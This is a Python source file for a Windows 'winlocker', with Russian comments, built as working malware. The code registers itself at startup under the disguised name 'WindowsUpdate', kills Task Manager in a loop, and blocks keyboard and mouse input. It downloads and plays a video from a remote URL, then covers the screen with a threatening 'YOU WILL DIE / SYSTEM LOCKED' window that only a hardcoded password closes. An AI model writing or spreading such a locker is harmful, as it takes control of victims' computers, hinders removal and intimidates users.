import ctypes, os, sys, time, threading, random, subprocess, urllib.request, tempfile, tkinter as tk

# === НАСТРОЙКИ ===
PASSWORD = "1601"
TIMER_SECONDS = 15  # для теста, потом 600
VIDEO_URL = "https://raw.githubusercontent.com/ippo123459-bit/winlocker/main/bg.mp4"
VIDEO_FILE = os.path.join(tempfile.gettempdir(), "bg.mp4")

# === БЛОКИРУЕМ КЛАВИАТУРУ И МЫШЬ ===
def block_input(block=True):
    ctypes.windll.user32.BlockInput(block)

# === БЛОКИРУЕМ WIN-КЛАВИШУ ===
def block_win_key():
    try:
        import keyboard
        keyboard.add_hotkey('windows', lambda: None, suppress=True)
        keyboard.add_hotkey('win', lambda: None, suppress=True)
    except:
        pass

# === УБИВАЕМ ДИСПЕТЧЕР ЗАДАЧ ===
def kill_taskmgr():
    while True:
        os.system("taskkill /f /im taskmgr.exe >nul 2>&1")
        time.sleep(0.1)

# === ПРОПИСЫВАЕМ В АВТОЗАГРУЗКУ ===
def add_to_startup():
    import winreg
    key = winreg.HKEY_CURRENT_USER
    subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        reg = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg, "WindowsUpdate", 0, winreg.REG_SZ,
                         sys.executable + ' "' + os.path.abspath(__file__) + '"')
        winreg.CloseKey(reg)
    except:
        pass

# === СКАЧИВАЕМ И ЗАПУСКАЕМ ВИДЕО ===
def play_video():
    try:
        if not os.path.exists(VIDEO_FILE):
            urllib.request.urlretrieve(VIDEO_URL, VIDEO_FILE)
        vlc_path = r"C:\Program Files\VideoLAN\VLC\vlc.exe"
        if os.path.exists(vlc_path):
            subprocess.Popen([vlc_path, "--fullscreen", "--no-video-title-show", VIDEO_FILE])
    except:
        pass

# === АНИМАЦИЯ ВЗЛОМА 0% → 100% ===
def show_boot_animation():
    root = tk.Tk()
    root.attributes('-fullscreen', True)
    root.configure(bg='black')
    lbl = tk.Label(root, text="", fg='white', bg='black', font=('Courier', 36, 'bold'))
    lbl.pack(expand=True)
    bar = tk.Canvas(root, width=600, height=30, bg='black', highlightthickness=0)
    bar.pack(pady=20)
    for i in range(0, 101, 5):
        lbl.config(text=f"ВЗЛОМ ctOS 2.0: {i}%")
        bar.delete("progress")
        bar.create_rectangle(10, 5, 10 + (i * 5.8), 25, fill='white', tags="progress")
        root.update()
        time.sleep(0.15)
    time.sleep(0.5)
    root.destroy()

# === ГЛАВНОЕ ОКНО БЛОКИРОВКИ ===
class WinLocker:
    def __init__(self):
        self.root = tk.Tk()
        self.root.withdraw()
        self.win = tk.Toplevel(self.root)
        self.win.attributes('-fullscreen', True)
        self.win.attributes('-topmost', True)
        self.win.configure(bg='black')
        self.win.overrideredirect(True)
        self.win.protocol("WM_DELETE_WINDOW", lambda: None)
        
        self.canvas = tk.Canvas(self.win, bg='black', highlightthickness=0)
        self.canvas.pack(fill='both', expand=True)
        
        self.canvas.create_text(400, 80, text="ВЫ УМРЁТЕ", fill='white', font=('Courier', 60, 'bold'), tags="title")
        self.canvas.create_text(400, 160, text="СИСТЕМА ЗАБЛОКИРОВАНА", fill='white', font=('Courier', 36))
        self.canvas.create_text(400, 300, text="ВВЕДИТЕ ПАРОЛЬ:", fill='white', font=('Courier', 28))
        
        self.entry = tk.Entry(self.win, show="*", font=('Courier', 28), bg='black', fg='white', insertbackground='white')
        self.canvas.create_window(400, 360, window=self.entry)
        self.status = self.canvas.create_text(400, 420, text="", fill='white', font=('Courier', 20))
        
        self.entry.bind('<Return>', self.check_password)
        self.entry.focus_set()
        self.animate()
    
    def check_password(self, event=None):
        if self.entry.get() == PASSWORD:
            block_input(False)
            self.root.destroy()
            os._exit(0)
        else:
            self.canvas.itemconfig(self.status, text="НЕВЕРНЫЙ ПАРОЛЬ!")
            self.entry.delete(0, tk.END)
    
    def animate(self):
        self.canvas.delete("skull")
        x_offset = random.randint(-5, 5)
        y_offset = random.randint(-5, 5)
        lines = [
            "      .-\"-.\"",
            "     /|6 6|\\",
            "    {/(_0_)\\}",
            "     _/ ^ \\_",
            "    (/ /^\\ \\)-'",
            "     \"\"' '\"\""
        ]
        y = 480
        for line in lines:
            self.canvas.create_text(400 + x_offset, y + y_offset, text=line, fill='white', font=('Courier', 16), tags="skull")
            y += 22
        
        for _ in range(20):
            x, y = random.randint(0, 800), random.randint(0, 600)
            s = random.randint(2, 4)
            self.canvas.create_oval(x, y, x+s, y+s, fill='white', outline='white', tags="particle")
        
        if random.random() < 0.1:
            self.canvas.itemconfig("title", fill='gray')
        else:
            self.canvas.itemconfig("title", fill='white')
        self.win.after(50, self.animate)

# === ЗАПУСК ===
if __name__ == "__main__":
    add_to_startup()
    threading.Thread(target=kill_taskmgr, daemon=True).start()
    time.sleep(TIMER_SECONDS)
    block_input(True)
    threading.Thread(target=block_win_key, daemon=True).start()
    threading.Thread(target=play_video, daemon=True).start()
    show_boot_animation()
    app = WinLocker()
    app.root.mainloop()
